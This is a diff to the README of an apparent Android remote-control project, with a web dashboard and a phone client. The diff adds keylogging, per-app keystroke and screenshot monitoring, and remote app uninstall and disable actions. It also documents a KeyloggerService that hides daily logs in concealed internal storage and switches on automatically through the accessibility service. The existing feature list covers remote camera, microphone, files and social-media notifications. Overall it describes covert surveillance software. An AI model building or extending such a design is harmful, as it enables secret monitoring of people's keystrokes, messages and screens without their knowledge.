@@ -20,14 +20,17 @@ A three-component remote device management system:
 | File | Role |
 |------|------|
 | `App.jsx` | Root state, WebSocket events, device/command state |
-| `Sidebar.jsx` | Device list with online/offline status |
+| `Sidebar.jsx` | Collapsible device list with online/offline status |
 | `StatusBar.jsx` | Server connection indicator |
 | `Overview.jsx` | Dashboard home with stats and activity log |
-| `DeviceControl.jsx` | Per-device control (3 tabs: Commands, Screen Control, Screen Reader) |
+| `DeviceControl.jsx` | Per-device control with 6 tabs |
 | `CommandPanel.jsx` | All remote commands organized into categories |
 | `ResultPanel.jsx` | Shows command results with image/audio rendering |
-| `ScreenControl.jsx` | Live stream viewer + recording management |
-| `ScreenReaderView.jsx` | Accessibility UI tree viewer |
+| `ScreenControl.jsx` | Live stream in phone frame (resolution-aware) + recording |
+| `ScreenReaderView.jsx` | Streaming UI tree viewer with visual phone frame overlay |
+| `KeyloggerTab.jsx` | Live keylog feed + per-day file download |
+| `AppManager.jsx` | App grid with open/stop/clear/disable/uninstall actions |
+| `AppMonitorTab.jsx` | Per-app keylogs + screenshot viewer for monitored packages |
 | `ParamModal.jsx` | Parameter input modal for commands requiring args |
 | `utils/reportGenerator.js` | Generates HTML reports from command results |
 
@@ -42,11 +45,20 @@ A three-component remote device management system:
 - **Camera**: list cameras, take photo, screenshot
 - **Audio**: record, stop, status, list recordings, get audio (base64), delete recording
 - **Files**: list, read, write, copy, move, create directory, search, info, delete
-- **Keylog**: get/clear keylogs
+- **Keylog**: get/clear keylogs, list files, download by date
+- **App Monitor**: list monitored apps, get app keylogs, list/download screenshots
+- **App Manager**: uninstall, force stop, open, clear data, disable
 - **Notifications**: all, by app, clear
 - **Screen Ctrl**: gestures, navigation, text input (requires accessibility service)
-- **Screen Read**: UI tree dump, element search
+- **Screen Read**: UI tree dump, element search, streaming mode
 - **Social Media**: quick access to WhatsApp/Instagram/Twitter/Facebook/Telegram/Snapchat/TikTok notifications
+
+## Android Features
+
+- **KeyloggerService** — Instance-based utility; per-day JSONL files in hidden internal storage (`/data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl`); auto-enabled when accessibility service connects
+- **AppMonitor** — Per-monitored-app keylogs + screenshots stored offline under `.am/<pkg>/`; configured via `Constants.MONITORED_PACKAGES`
+- **UnifiedAccessibilityService** — Hooks `onTextChanged` and `onAppForeground` events to feed both KeyloggerService and AppMonitor
+- **SocketManager** — Routes all keylogger/app-monitor/app-manager commands; exposes `getKeylogger()` and `getAppMonitor()` accessors
 
 ## Android App Capabilities
 
